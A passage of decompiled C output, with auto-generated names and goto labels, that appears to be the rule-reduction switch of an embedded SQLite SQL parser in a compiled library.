      v147[0] = a1[v3];
      v8 = a1[v3 + 4] + a1[v3 + 5] - a1[v3];
      goto LABEL_276;
    case 57:
    case 59:
      v34 = &a1[v3 + 4];
      goto LABEL_54;
    case 58:
      v34 = &a1[v3];
LABEL_54:
      v35 = (int *)v148;
      goto LABEL_55;
    case 60:
      v41 = v148;
      v142 = sub_10075DC6(0, 0, (int *)v148, 156, a1[v3 + 4]);
      v143 = *(v4 - 3);
      v144 = (int *)v4[3];
      goto LABEL_62;
    case 61:
      v41 = v148;
      sub_10082349((int)&a1[v3 + 4], (int *)v148, &v142, 94);
LABEL_62:
      v34 = (int *)&v142;
      v35 = (int *)v41;
LABEL_55:
      sub_1006A872(v35, (int)v34);
      goto LABEL_56;
    case 63:
      v42 = *(_DWORD *)(v148 + 500);
      if ( v42 )
      {
        v43 = *(_DWORD *)(v42 + 12);
        if ( v43 >= 1 )
          *(_BYTE *)(24 * v43 + *(_DWORD *)(v42 + 16) - 4) = *((_BYTE *)v4 + 4);
      }
      goto LABEL_57;
    case 64:
      sub_1006A905(v148, 0, a1[v3], a1[v3 + 4], a1[v3 - 4]);
      goto LABEL_57;
    case 65:
      v119 = a1[v3 + 4];
      v117 = 0;
      goto LABEL_86;
    case 66:
      sub_1006AA62(v148, (_DWORD *)a1[v3]);
      goto LABEL_57;
    case 67:
      sub_1006B82C((int)&a1[v3 - 4], v148, 0, (int *)a1[v3], a1[v3 + 4]);
      goto LABEL_57;
    case 68:
      sub_1006BAD2(v148, a1[v3 + 4]);
      goto LABEL_57;
    case 69:
      sub_1006AA9A((int *)v148, (int)&a1[v3 + 4]);
      goto LABEL_57;
    case 73:
      v6 = a1[v3 + 4] | a1[v3] & ~a1[v3 + 5];
      goto LABEL_293;
    case 74:
    case 75:
    case 137:
    case 146:
    case 163:
    case 251:
      v147[0] = 0;
      goto LABEL_273;
    case 76:
      v147[0] = a1[v3 + 4];
      v147[1] = 255;
      goto LABEL_57;
    case 77:
      v147[0] = a1[v3 + 4] << 8;
      v147[1] = 65280;
      goto LABEL_57;
    case 79:
      v147[0] = 8;
      goto LABEL_57;
    case 80:
      v147[0] = 9;
      goto LABEL_57;
    case 81:
      v147[0] = 6;
      goto LABEL_57;
    case 84:
    case 99:
    case 101:
    case 104:
    case 113:
    case 144:
    case 152:
    case 155:
    case 160:
    case 162:
    case 169:
    case 236:
    case 238:
    case 240:
    case 283:
    case 305:
      goto LABEL_101;
    case 88:
      v147[1] = 0;
LABEL_81:
      v147[0] = 0;
      goto LABEL_57;
    case 89:
      v147[0] = a1[v3];
      v8 = a1[v3 + 1];
      goto LABEL_276;
    case 94:
      sub_1006A905(v148, (int *)a1[v3 - 8], a1[v3 + 4], a1[v3 - 4], 0);
      goto LABEL_57;
    case 95:
      v119 = a1[v3 + 4];
      v117 = (int *)a1[v3 - 4];
LABEL_86:
      sub_1006BC68(0, (int *)v148, 0, 0, v117, v119, 0, 0, 0, 0);
      goto LABEL_57;
    case 96:
      sub_1006AA62(v148, (_DWORD *)a1[v3 - 4]);
      goto LABEL_57;
    case 97:
      sub_1006B82C((int)&a1[v3 - 8], v148, (int *)a1[v3 - 20], (int *)a1[v3 - 4], a1[v3]);
      sub_1006BAD2(v148, v4[1]);
      goto LABEL_57;
    case 100:
      v147[0] = 99;
      goto LABEL_57;
    case 102:
      LOBYTE(v147[0]) = 99;
      goto LABEL_57;
    case 103:
    case 176:
      LOBYTE(v147[0]) = a1[v3 + 4];
      goto LABEL_57;
    case 105:
      v147[0] = 4;
      goto LABEL_57;
    case 106:
      v147[0] = 5;
      goto LABEL_57;
    case 107:
      sub_1006B62B((int *)v148, a1[v3 + 4], 0, a1[v3]);
      goto LABEL_57;
    case 110:
      sub_1006B0BD((int *)v148, &a1[v3 - 24], (int)&a1[v3 - 8], (int)&a1[v3 - 4], a1[v3 + 4], a1[v3 - 20], a1[v3 - 12]);
      goto LABEL_57;
    case 111:
      sub_1006B62B((int *)v148, a1[v3 + 4], 1, a1[v3]);
      goto LABEL_57;
    case 112:
      v44 = (int *)v148;
      v141[1] = 0;
      v142 = 0;
      v143 = 0;
      v144 = 0;
      v127 = (_DWORD **)a1[v3 + 4];
      v141[0] = 5;
      sub_1007E480(v148, v127, v141);
      sub_1007B016(*v44, v4[1]);
      goto LABEL_57;
    case 114:
      if ( a1[v3 + 4] )
      {
        *(_BYTE *)(a1[v3 + 4] + 4) = a1[v3];
        *(_DWORD *)(a1[v3 + 4] + 28) = a1[v3 - 4];
      }
      else
      {
        sub_1007B016(*(_DWORD *)v148, a1[v3 - 4]);
      }
      goto LABEL_101;
    case 116:
      v147[0] = 113;
      goto LABEL_57;
    case 118:
      v6 = (int)sub_1007AF57(
                  (int *)a1[v3 - 20],
                  (int *)v148,
                  a1[v3 - 16],
                  a1[v3 - 12],
                  a1[v3 - 8],
                  a1[v3 - 4],
                  a1[v3],
                  a1[v3 - 24],
                  a1[v3 + 4],
                  a1[v3 + 5]);
      goto LABEL_293;
    case 122:
    case 149:
    case 181:
    case 248:
      goto LABEL_279;
    case 124:
      v45 = (int)v146;
      v46 = sub_100766CA((int *)v148, (int *)*(v146 - 7), a1[v3]);
      v147[0] = (int)v46;
      if ( v146[2] )
      {
        sub_1007674E((char *)v46, (int)(v146 + 1), (int *)v148, 1);
        v46 = (int *)v147[0];
      }
      v47 = *(_DWORD *)v148;
      if ( !v46 )
        goto LABEL_247;
      v48 = 20 * *v46 + v46[3] - 20;
      sub_10058EC7(v47, *(_DWORD *)(v48 + 8));
      *(_DWORD *)(v48 + 8) = sub_100591D0(v47, *(v146 - 1) - *(v146 - 2), (void *)*(v146 - 2));
      goto LABEL_56;
    case 125:
      v49 = sub_10075D3B(*(_DWORD *)v148, 113);
      v50 = (int *)*(v146 - 3);
      goto LABEL_110;
    case 126:
      v144 = sub_10075DC6((const void **)&a1[v3 + 4], 0, (int *)v148, 113, 0);
      v52 = sub_10075DC6((const void **)v4 - 7, 0, (int *)v148, 26, 0);
      v49 = sub_10075DC6(0, (unsigned int)v144, (int *)v148, 118, (unsigned int)v52);
      v50 = (int *)*(v146 - 11);
      v51 = (int *)v148;
      goto LABEL_111;
    case 129:
      goto LABEL_273;
    case 130:
      v6 = (int)sub_1005904B(*(_DWORD *)v148, 0x40u);
      goto LABEL_293;
    case 131:
      v147[0] = a1[v3 + 4];
      sub_1006C978((__int16 *)v147[0]);
      goto LABEL_57;
    case 132:
      v147[0] = a1[v3];
      if ( v147[0] && *(__int16 *)v147[0] > 0 )
        *(_BYTE *)(56 * *(__int16 *)v147[0] + v147[0] - 27) = a1[v3 + 4];
      goto LABEL_57;
    case 134:
      v147[0] = (int)sub_1006C893(
                       (__int16 *)a1[v3 - 20],
                       (int *)v148,
                       (int)&a1[v3 - 16],
                       &a1[v3 - 12],
                       (int)&a1[v3 - 8],
                       0,
                       a1[v3],
                       (unsigned int *)a1[v3 + 4]);
      sub_1006C93D(v4 - 7, (__int16 *)v147[0], (int *)v148);
      goto LABEL_57;
    case 135:
      v6 = (int)sub_1006C893(
                  (__int16 *)a1[v3 - 20],
                  (int *)v148,
                  0,
                  0,
                  (int)&a1[v3 - 4],
                  a1[v3 - 12],
                  a1[v3],
                  (unsigned int *)a1[v3 + 4]);
      goto LABEL_293;
    case 136:
      if ( a1[v3 - 20] || a1[v3 - 3] || a1[v3] || a1[v3 + 4] )
      {
        sub_1006C978((__int16 *)a1[v3 - 12]);
        v53 = sub_1007AF57(0, (int *)v148, *(v4 - 15), 0, 0, 0, 0, 0, 0, 0);
        v6 = (int)sub_1006C893(
                    (__int16 *)*(v4 - 23),
                    (int *)v148,
                    0,
                    0,
                    (int)(v4 - 7),
                    (unsigned int)v53,
                    *(v4 - 3),
                    (unsigned int *)v4[1]);
      }
      else
      {
        v6 = a1[v3 - 12];
      }
      goto LABEL_293;
    case 139:
      v6 = (int)sub_1006C71D(0, *(_DWORD *)v148, (int)&a1[v3], &a1[v3 + 4]);
      goto LABEL_293;
    case 141:
      v6 = sub_1007B034((int *)v148, (int)&a1[v3], 0, 0);
      goto LABEL_293;
    case 142:
      v6 = sub_1007B034((int *)v148, (int)&a1[v3 - 4], (int)&a1[v3], 0);
      goto LABEL_293;
    case 143:
      v6 = sub_1007B034((int *)v148, (int)&a1[v3 - 8], (int)&a1[v3 - 4], (int)&a1[v3]);
      goto LABEL_293;
    case 148:
      v147[0] = 0;
      v147[1] = 1;
      goto LABEL_57;
    case 153:
      v54 = sub_100766CA((int *)v148, (int *)*(v146 - 11), a1[v3]);
      v147[0] = (int)v54;
      goto LABEL_134;
    case 154:
      v55 = sub_100766CA((int *)v148, 0, a1[v3]);
      v147[0] = (int)v55;
      if ( v55 )
      {
        v56 = v55[3];
        if ( v56 )
          *(_BYTE *)(v56 + 12) = *((_BYTE *)v146 + 4);
      }
      goto LABEL_56;
    case 164:
      v57 = a1[v3 + 4];
      goto LABEL_272;
    case 165:
      v147[0] = a1[v3 - 4];
      goto LABEL_275;
    case 166:
      v147[1] = a1[v3 - 4];
LABEL_101:
      v6 = v4[1];
      goto LABEL_293;
    case 167:
      sub_1006C93D(&a1[v3], (__int16 *)a1[v3 - 4], (int *)v148);
      sub_1008027F(v148, *(v4 - 7), (void **)v4[1]);
      goto LABEL_57;
    case 170:
      sub_1006C93D(&a1[v3 - 8], (__int16 *)a1[v3 - 12], (int *)v148);
      sub_1007678C((_DWORD *)*(v4 - 3), (int *)v148, aSetList);
      sub_10084205((int *)v148, *(v4 - 15), (int *)*(v4 - 3), (void **)v4[1], *((unsigned __int8 *)v4 - 76));
      goto LABEL_57;
    case 171:
      v45 = (int)v146;
      v147[0] = (int)sub_100766CA((int *)v148, (int *)*(v146 - 15), a1[v3 + 4]);
      sub_1007674E((char *)v147[0], (int)(v146 - 7), (int *)v148, 1);
      goto LABEL_247;
    case 172:
      v147[0] = (int)sub_100766CA((int *)v148, 0, a1[v3 + 4]);
      sub_1007674E((char *)v147[0], (int)(v146 - 7), (int *)v148, 1);
      goto LABEL_56;
    case 173:
      sub_1007967E(v148, a1[v3 - 16], (int *)a1[v3], 0, (unsigned int *)a1[v3 - 12], LOBYTE(a1[v3 - 24]));
      goto LABEL_57;
    case 174:
      sub_1007967E(v148, a1[v3 - 4], 0, (int **)a1[v3 + 4], (unsigned int *)a1[v3], LOBYTE(a1[v3 - 12]));
      goto LABEL_57;
    case 175:
      sub_1007967E(v148, a1[v3 - 8], 0, 0, (unsigned int *)a1[v3 - 4], LOBYTE(a1[v3 - 16]));
      goto LABEL_57;
    case 177:
      LOBYTE(v147[0]) = 5;
      goto LABEL_57;
    case 178:
    case 242:
      v49 = (_DWORD *)a1[v3 + 4];
      v50 = (int *)*(v146 - 7);
      goto LABEL_110;
    case 179:
    case 243:
      v49 = (_DWORD *)a1[v3 + 4];
      v50 = 0;
      goto LABEL_110;
    case 182:
      v6 = (int)sub_1006C56B((unsigned int *)a1[v3 - 4], *(_DWORD *)v148, (int)&a1[v3 + 4]);
      goto LABEL_293;
    case 183:
      v6 = (int)sub_1006C56B(0, *(_DWORD *)v148, (int)&a1[v3 + 4]);
      goto LABEL_293;
    case 184:
    case 212:
      v147[0] = a1[v3 + 4];
      v147[1] = a1[v3 + 5];
      v147[2] = a1[v3 + 6];
      goto LABEL_57;
    case 185:
      v58 = (_DWORD *)a1[v3];
      goto LABEL_163;
    case 186:
    case 191:
    case 192:
      sub_10082349((int)&a1[v3 + 4], (int *)v148, v147, *((unsigned __int8 *)v146 + 2));
      goto LABEL_56;
    case 187:
    case 188:
      sub_10082349((int)&a1[v3 + 4], (int *)v148, v147, 26);
      goto LABEL_56;
    case 189:
      v144 = sub_10075DC6((const void **)&a1[v3 - 4], 0, (int *)v148, 26, 0);
      v59 = sub_10075DC6((const void **)v4 + 1, 0, (int *)v148, 26, 0);
      v58 = sub_10075DC6(0, (unsigned int)v59, (int *)v148, 118, (unsigned int)v144);
LABEL_163:
      v147[0] = (int)v58;
      goto LABEL_216;
    case 190:
      v139 = sub_10075DC6((const void **)&a1[v3 - 12], 0, (int *)v148, 26, 0);
      v144 = sub_10075DC6((const void **)v4 - 7, 0, (int *)v148, 26, 0);
      v60 = sub_10075DC6((const void **)v4 + 1, 0, (int *)v148, 26, 0);
      v61 = sub_10075DC6(0, (unsigned int)v60, (int *)v148, 118, (unsigned int)v144);
      v147[0] = (int)sub_10075DC6(0, (unsigned int)v61, (int *)v148, 118, (unsigned int)v139);
      goto LABEL_238;
    case 193:
      if ( *(_BYTE *)(v148 + 19) )
      {
        v62 = sub_10075DC6((const void **)&a1[v3 + 4], 0, (int *)v148, 132, 0);
        v147[0] = (int)v62;
        if ( v62 )
          sub_100598E8((_BYTE *)(v4[1] + 1), v62 + 6);
      }
      else
      {
        sub_10059320((int *)v148, aNearTSyntaxErr, &a1[v3 + 4]);
        v147[0] = 0;
      }
      v63 = v4[1];
      goto LABEL_300;
    case 194:
      v64 = v148;
      v65 = &a1[v3 + 4];
      sub_10082349((int)v65, (int *)v148, v147, 133);
      sub_10075E6F(v64, v147[0]);
      v147[1] = *v65;
      v147[2] = *v65 + v65[1];
      goto LABEL_56;
    case 195:
      v147[0] = sub_10075930((int)&a1[v3 + 4], (int *)v148, a1[v3 - 4]);
      v63 = *(v4 - 6);
      goto LABEL_300;
    case 196:
      v147[0] = (int)sub_10075DC6((const void **)&a1[v3], 0, (int *)v148, 37, a1[v3 - 8]);
      goto LABEL_299;
    case 197:
      v66 = (_DWORD *)a1[v3];
      if ( v66 && *v66 > *(_DWORD *)(*(_DWORD *)v148 + 96) )
        sub_10059320((int *)v148, aTooManyArgumen, &a1[v3 - 12]);
      v67 = sub_10075E2C((const void **)v4 - 15, (int *)v148, (int *)*(v4 - 3));
      v147[0] = (int)v67;
      v147[1] = *(v4 - 15);
      v147[2] = v4[1] + v4[2];
      if ( *(v4 - 7) && v67 )
        *((_WORD *)v67 + 1) |= 0x10u;
      goto LABEL_57;
    case 198:
      v147[0] = (int)sub_10075E2C((const void **)&a1[v3 - 8], (int *)v148, 0);
      v63 = *(v4 - 11);
      goto LABEL_300;
    case 199:
      v68 = (const void **)&a1[v3 + 4];
      v69 = sub_10075E2C(v68, (int *)v148, 0);
      v147[0] = (int)v69;
      if ( v69 )
        *(_BYTE *)v69 = -101;
      v147[1] = (int)*v68;
      v70 = (int)*v68 + v4[2];
      goto LABEL_301;
    case 200:
    case 201:
    case 202:
    case 203:
    case 204:
    case 205:
    case 206:
    case 207:
      sub_10082374(v147, (int *)v148, BYTE2(a1[v3 - 1]), (unsigned int *)&a1[v3 - 4], (unsigned int *)&a1[v3 + 4]);
      goto LABEL_56;
    case 208:
    case 210:
      v147[0] = a1[v3 + 4];
      v71 = a1[v3 + 5];
      v147[2] = 0;
      v147[1] = v71;
      goto LABEL_57;
    case 209:
    case 211:
      v147[0] = a1[v3 + 4];
      v147[1] = a1[v3 + 5];
      v147[2] = 1;
      goto LABEL_57;
    case 213:
      memset(v147, 0, sizeof(v147));
      goto LABEL_57;
    case 214:
      v72 = sub_100766CA((int *)v148, 0, a1[v3]);
      v73 = (int)v146;
      v74 = sub_100766CA((int *)v148, v72, *(v146 - 11));
      v75 = v146[1];
      v76 = v74;
      if ( v75 )
        v76 = sub_100766CA((int *)v148, v74, v75);
      v77 = sub_10075E2C((const void **)v146 - 7, (int *)v148, v76);
      v147[0] = (int)v77;
      if ( *(v146 - 5) )
      {
        v77 = sub_10075DC6(0, 0, (int *)v148, 19, (unsigned int)v77);
        v73 = (int)v146;
        v147[0] = (int)v77;
      }
      v147[1] = *(_DWORD *)(v73 - 40);
      v147[2] = *(_DWORD *)(v73 - 4);
      if ( v77 )
        *((_WORD *)v77 + 1) |= 0x80u;
      goto LABEL_56;
    case 215:
      sub_100823A5(v147, (int *)v148, BYTE2(a1[v3 + 3]), (unsigned int *)&a1[v3], &a1[v3 + 4]);
      goto LABEL_56;
    case 216:
      sub_100823A5(v147, (int *)v148, 74, (unsigned int *)&a1[v3 - 4], &a1[v3 + 4]);
      goto LABEL_56;
    case 217:
      v78 = (unsigned int *)&a1[v3 + 4];
      sub_10082374(v147, (int *)v148, 70, (unsigned int *)&a1[v3 - 4], v78);
      sub_100823D5((int *)v148, (_BYTE *)*v78, v147[0], 73);
      goto LABEL_56;
    case 218:
      v79 = (unsigned int *)&a1[v3 + 4];
      sub_10082374(v147, (int *)v148, 146, (unsigned int *)&a1[v3 - 8], v79);
      sub_100823D5((int *)v148, (_BYTE *)*v79, v147[0], 74);
      goto LABEL_56;
    case 219:
    case 220:
      sub_100823FB(v147, (int *)v148, BYTE2(a1[v3 - 1]), (unsigned int *)&a1[v3 + 4], &a1[v3]);
      goto LABEL_56;
    case 221:
      sub_100823FB(v147, (int *)v148, 156, (unsigned int *)&a1[v3 + 4], &a1[v3]);
      goto LABEL_56;
    case 222:
      sub_100823FB(v147, (int *)v148, 157, (unsigned int *)&a1[v3 + 4], &a1[v3]);
      goto LABEL_56;
    case 225:
      v80 = sub_100766CA((int *)v148, 0, a1[v3 - 4]);
      v81 = (int *)v148;
      v82 = sub_100766CA((int *)v148, v80, v146[1]);
      v83 = sub_10075DC6(0, 0, (int *)v148, 71, *(v146 - 15));
      v147[0] = (int)v83;
      if ( v83 )
        v83[4] = v82;
      else
        sub_100767B1(v82, *(_DWORD *)v148);
      v4 = v146;
      if ( *(v146 - 11) )
        v147[0] = (int)sub_10075DC6(0, 0, v81, 19, v147[0]);
      v147[1] = *(v146 - 14);
      v70 = v146[3];
      goto LABEL_301;
    case 228:
      v84 = (int *)v148;
      v85 = sub_10075DC6(0, 0, (int *)v148, 72, a1[v3 - 12]);
      v147[0] = (int)v85;
      if ( v85 )
      {
        v85[4] = *(v4 - 3);
        sub_10075C58(v147[0], v84);
      }
      else
      {
        sub_100767B1((int *)*(v4 - 3), *(_DWORD *)v148);
      }
      v86 = *(v4 - 11) == 0;
      goto LABEL_221;
    case 229:
      v87 = (int *)v148;
      v88 = sub_10075DC6(0, 0, (int *)v148, 116, 0);
      v147[0] = (int)v88;
      if ( v88 )
      {
        v88[4] = *(v4 - 3);
        *(_WORD *)(v147[0] + 2) |= 0x800u;
        sub_10075C58(v147[0], v87);
      }
      else
      {
        sub_1007B016(*(_DWORD *)v148, *(v4 - 3));
      }
LABEL_216:
      v63 = *(v4 - 7);
      goto LABEL_300;
    case 230:
      v84 = (int *)v148;
      v89 = sub_10075DC6(0, 0, (int *)v148, 72, a1[v3 - 12]);
      v147[0] = (int)v89;
      if ( v89 )
      {
        v89[4] = *(v4 - 3);
        *(_WORD *)(v147[0] + 2) |= 0x800u;
        sub_10075C58(v147[0], v84);
      }
      else
      {
        sub_1007B016(*(_DWORD *)v148, *(v4 - 3));
      }
      v86 = *(v4 - 11) == 0;
LABEL_221:
      if ( !v86 )
        v147[0] = (int)sub_10075DC6(0, 0, v84, 19, v147[0]);
      v63 = *(v4 - 14);
      goto LABEL_300;
    case 231:
      v90 = *(_DWORD *)v148;
      v144 = &a1[v3 + 4];
      v139 = &a1[v3];
      v91 = sub_1006C71D(0, v90, (int)&a1[v3], v144);
      v124 = *(v4 - 11);
      v140 = v91;
      v147[0] = (int)sub_10075DC6(0, 0, (int *)v148, 72, v124);
      if ( v147[0] )
      {
        *(_DWORD *)(v147[0] + 16) = sub_1007AF57(0, (int *)v148, (int)v140, 0, 0, 0, 0, 0, 0, 0);
        *(_WORD *)(v147[0] + 2) |= 0x800u;
        sub_10075C58(v147[0], (int *)v148);
      }
      else
      {
        sub_1006C7F7(v140, *(_DWORD *)v148);
        v4 = v146;
      }
      if ( *(v4 - 7) )
        v147[0] = (int)sub_10075DC6(0, 0, (int *)v148, 19, v147[0]);
      v147[1] = *(v4 - 10);
      if ( *v144 )
      {
        v147[2] = *v144 + v4[2];
      }
      else
      {
        v70 = *v139 + *(v4 - 2);
LABEL_301:
        v147[2] = v70;
      }
LABEL_57:
      v36 = (unsigned __int8)byte_100FE319[2 * a2];
      v37 = byte_100FE318[2 * a2];
      result = (int)a1;
      *a1 -= v36;
      v149 = *a1;
      v39 = &v4[-4 * v36];
      v40 = word_100FC608[v37 + word_100FDB68[*(unsigned __int16 *)v39]];
      if ( v40 >= 0x277u )
      {
        v114 = a1[2];
        if ( v149 >= 0 )
        {
          do
            sub_1008250D(a1);
          while ( *a1 >= 0 );
        }
        result = (int)a1;
        a1[2] = v114;
      }
      else if ( v36 )
      {
        *a1 = v149 + 1;
        *((_WORD *)v39 + 8) = v40;
        *((_BYTE *)v39 + 18) = v37;
        v39[5] = v147[0];
        v39[6] = v147[1];
        v39[7] = v147[2];
      }
      else
      {
        return sub_100825AD(a1, v40, v37, v147);
      }
      return result;
    case 232:
      v92 = (int *)v148;
      v93 = sub_10075DC6(0, 0, (int *)v148, 20, 0);
      v147[0] = (int)v93;
      if ( v93 )
      {
        v94 = *(v4 - 3);
        *((_WORD *)v93 + 1) |= 0x800u;
        v93[4] = v94;
        sub_10075C58((int)v93, v92);
      }
      else
      {
        sub_1007B016(*(_DWORD *)v148, *(v4 - 3));
      }
      goto LABEL_296;
    case 233:
      v95 = (int *)v148;
      v96 = sub_10075DC6(0, a1[v3], (int *)v148, 134, a1[v3 - 8]);
      v147[0] = (int)v96;
      if ( v96 )
      {
        v96[4] = *(v4 - 7);
        sub_10075C58(v147[0], v95);
      }
      else
      {
        sub_100767B1((int *)*(v4 - 7), *(_DWORD *)v148);
      }
LABEL_238:
      v63 = *(v4 - 15);
      goto LABEL_300;
    case 234:
      v45 = (int)v146;
      v147[0] = (int)sub_100766CA((int *)v148, (int *)*(v146 - 15), a1[v3 - 4]);
      v147[0] = (int)sub_100766CA((int *)v148, (int *)v147[0], v146[1]);
      goto LABEL_247;
    case 235:
      v147[0] = (int)sub_100766CA((int *)v148, 0, a1[v3 - 4]);
      v49 = (_DWORD *)v146[1];
      v50 = (int *)v147[0];
LABEL_110:
      v51 = (int *)v148;
LABEL_111:
      v147[0] = (int)sub_100766CA(v51, v50, (unsigned int)v49);
      goto LABEL_56;
    case 244:
      v132 = a1[v3 - 24];
      v125 = &a1[v3 + 4];
      v122 = (int)&a1[v3 - 36];
      v120 = a1[v3 - 32];
      v118 = (int *)a1[v3];
      v116 = sub_1006C71D(0, *(_DWORD *)v148, (int)&a1[v3 - 8], 0);
      sub_1006BC68((int)(v4 - 19), (int *)v148, (int)(v4 - 23), (int)v116, v118, v120, v122, v125, 0, v132);
      goto LABEL_57;
    case 245:
    case 299:
      v147[0] = 2;
      goto LABEL_57;
    case 249:
      v97 = 0;
      if ( a1[v3 + 1] )
      {
        v97 = sub_10075D3B(*(_DWORD *)v148, 152);
        sub_10075930((int)(v4 - 3), (int *)v148, (int)v97);
      }
      v98 = (unsigned int)v97;
      v45 = (int)v146;
      v147[0] = (int)sub_100766CA((int *)v148, (int *)*(v146 - 15), v98);
      sub_1007674E((char *)v147[0], (int)(v146 - 7), (int *)v148, 1);
      sub_1007678C((_DWORD *)v147[0], (int *)v148, aIndex_0);
      if ( !v147[0] )
        goto LABEL_56;
      *(_BYTE *)(20 * *(_DWORD *)v147[0] + *(_DWORD *)(v147[0] + 12) - 8) = *((_BYTE *)v146 + 4);
LABEL_247:
      v4 = (unsigned int *)v45;
      goto LABEL_57;
    case 250:
      v99 = 0;
      if ( a1[v3 + 1] )
      {
        v99 = sub_10075DC6(0, 0, (int *)v148, 152, 0);
        sub_10075930((int)(v4 - 3), (int *)v148, (int)v99);
      }
      v147[0] = (int)sub_100766CA((int *)v148, 0, (unsigned int)v99);
      sub_1007674E((char *)v147[0], (int)(v146 - 7), (int *)v148, 1);
      sub_1007678C((_DWORD *)v147[0], (int *)v148, aIndex_1);
      v54 = (int *)v147[0];
LABEL_134:
      if ( v54 )
        *(_BYTE *)(20 * *v54 + v54[3] - 8) = *((_BYTE *)v146 + 4);
LABEL_56:
      v4 = v146;
      goto LABEL_57;
    case 253:
      sub_1006C3C7(v148, a1[v3 + 4], a1[v3]);
      goto LABEL_57;
    case 254:
    case 255:
      v100 = sub_1007C271((int *)v148);
      if ( v100 )
        sub_1005AB66((int)v100, 117, 0, 0, 0);
      goto LABEL_57;
    case 256:
      sub_10088909((int *)v148, (int)&a1[v3], (int)&a1[v3 + 4], 0, 0);
      goto LABEL_57;
    case 257:
      v133 = 0;
      goto LABEL_260;
    case 258:
      sub_10088909((int *)v148, (int)&a1[v3 - 12], (int)&a1[v3 - 8], (int)&a1[v3], 0);
      goto LABEL_57;
    case 259:
      v133 = 1;
LABEL_260:
      sub_10088909((int *)v148, (int)&a1[v3 - 8], (int)&a1[v3 - 4], (int)&a1[v3 + 4], v133);
      goto LABEL_57;
    case 260:
      sub_10088909((int *)v148, (int)&a1[v3 - 12], (int)&a1[v3 - 8], (int)&a1[v3], 1);
      goto LABEL_57;
    case 271:
      v101 = a1[v3 + 4] + a1[v3 + 5];
      v143 = *(v4 - 11);
      v128 = *(v4 - 3);
      v144 = (int *)(v101 - v143);
      sub_10072B4C((int *)v148, v128, (int)&v143);
      goto LABEL_57;
    case 272:
      v102 = &a1[v3 - 20];
      v103 = &a1[v3 - 24];
      sub_10072887(
        (int *)v4 - 27,
        (int)v102,
        (int *)v148,
        *(v4 - 19),
        *(v4 - 15),
        (unsigned int *)*(v4 - 14),
        *(v4 - 7),
        (void **)a1[v3 + 4],
        a1[v3 - 36],
        a1[v3 - 28]);
      if ( *(v4 - 22) )
      {
        v104 = *v102;
        v105 = v102[1];
      }
      else
      {
        v104 = *v103;
        v105 = v103[1];
      }
      v147[0] = v104;
      v147[1] = v105;
      goto LABEL_57;
    case 273:
    case 276:
      v147[0] = 34;
      goto LABEL_57;
    case 274:
      v147[0] = 30;
      goto LABEL_57;
    case 275:
      v147[0] = 48;
      goto LABEL_57;
    case 277:
    case 278:
      v57 = BYTE2(a1[v3 + 3]);
LABEL_272:
      v147[0] = v57;
LABEL_273:
      v147[1] = 0;
      goto LABEL_57;
    case 279:
      v147[0] = 107;
LABEL_275:
      v8 = a1[v3 + 4];
LABEL_276:
      v147[1] = v8;
      goto LABEL_57;
    case 284:
      *(_DWORD *)(*(_DWORD *)(a1[v3 - 4] + 36) + 32) = a1[v3];
      *(_DWORD *)(a1[v3 - 4] + 36) = a1[v3];
      v6 = a1[v3 - 4];
      goto LABEL_293;
    case 285:
      *(_DWORD *)(a1[v3] + 36) = a1[v3];
LABEL_279:
      v6 = a1[v3];
      goto LABEL_293;
    case 287:
      v147[0] = a1[v3 + 4];
      v147[1] = a1[v3 + 5];
      sub_10059320((int *)v148, aQualifiedTable);
      goto LABEL_57;
    case 289:
      sub_10059320((int *)v148, aTheIndexedByCl);
      goto LABEL_57;
    case 290:
      sub_10059320((int *)v148, aTheNotIndexedC);
      goto LABEL_57;
    case 291:
      v6 = (int)sub_10072DD5((int *)a1[v3], (int)&a1[v3 - 12], *(_DWORD *)v148, (void **)a1[v3 + 4], a1[v3 - 16]);
      goto LABEL_293;
    case 292:
      v6 = (int)sub_10072D61(
                  (unsigned int *)a1[v3 - 12],
                  (int)&a1[v3 - 16],
                  *(_DWORD *)v148,
                  (int *)a1[v3],
                  0,
                  a1[v3 - 24]);
      goto LABEL_293;
    case 293:
      v6 = (int)sub_10072D61((unsigned int *)a1[v3], (int)&a1[v3 - 4], *(_DWORD *)v148, 0, a1[v3 + 4], a1[v3 - 12]);
      goto LABEL_293;
    case 294:
      v6 = (int)sub_10072E36((int)&a1[v3 - 4], *(_DWORD *)v148, (void **)a1[v3 + 4]);
      goto LABEL_293;
    case 295:
      v106 = *(_DWORD *)v148;
      v107 = a1[v3 + 4];
      v6 = (int)sub_1005904B(*(_DWORD *)v148, 0x28u);
      if ( v6 )
      {
        *(_BYTE *)v6 = 116;
        *(_DWORD *)(v6 + 8) = v107;
        *(_BYTE *)(v6 + 1) = 99;
      }
      else
      {
        sub_1007B016(v106, v107);
        v6 = 0;
      }
LABEL_293:
      v147[0] = v6;
      goto LABEL_57;
    case 296:
      v108 = sub_10075DC6(0, 0, (int *)v148, 56, 0);
      v147[0] = (int)v108;
      if ( v108 )
        *((_BYTE *)v108 + 1) = 4;
LABEL_296:
      v63 = *(v4 - 11);
      goto LABEL_300;
    case 297:
      v109 = sub_10075DC6((const void **)&a1[v3], 0, (int *)v148, 56, 0);
      v147[0] = (int)v109;
      if ( v109 )
        *((_BYTE *)v109 + 1) = *((_BYTE *)v4 - 44);
LABEL_299:
      v63 = *(v4 - 19);
LABEL_300:
      v147[1] = v63;
      v70 = v4[1] + v4[2];
      goto LABEL_301;
    case 300:
      v147[0] = 3;
      goto LABEL_57;
    case 301:
      sub_10072EB2((int *)v148, a1[v3 + 4], a1[v3]);
      goto LABEL_57;
    case 302:
      sub_10078ECE(
        (int *)v148,
        24,
        byte_1017FA48,
        (unsigned __int8 *)a1[v3 - 8],
        (unsigned __int8 *)a1[v3],
        (unsigned __int8 *)a1[v3 + 4]);
      goto LABEL_57;
    case 303:
      sub_10078ECE((int *)v148, 25, byte_1017FA18, 0, 0, (unsigned __int8 *)a1[v3 + 4]);
      goto LABEL_57;
    case 312:
      sub_100751FD((int *)v148, a1[v3 - 8], (int)&a1[v3 + 4]);
      goto LABEL_57;
    case 313:
      sub_1007558D((int *)v148, (int)&a1[v3 + 4]);
      goto LABEL_57;
    case 314:
      v110 = (int *)v148;
      *(_BYTE *)(*(_DWORD *)v148 + 226) = 0;
      sub_10075748(v110, a1[v3 + 4]);
      goto LABEL_57;
    case 317:
      sub_10071099((int *)v148, 0);
      goto LABEL_57;
    case 318:
      sub_10071099((int *)v148, &a1[v3 + 4]);
      goto LABEL_57;
    case 319:
      sub_10070FBC((int)&a1[v3 - 4], (int *)v148, &a1[v3 - 8], &a1[v3 + 4]);
      goto LABEL_57;
    case 322:
      v111 = v148;
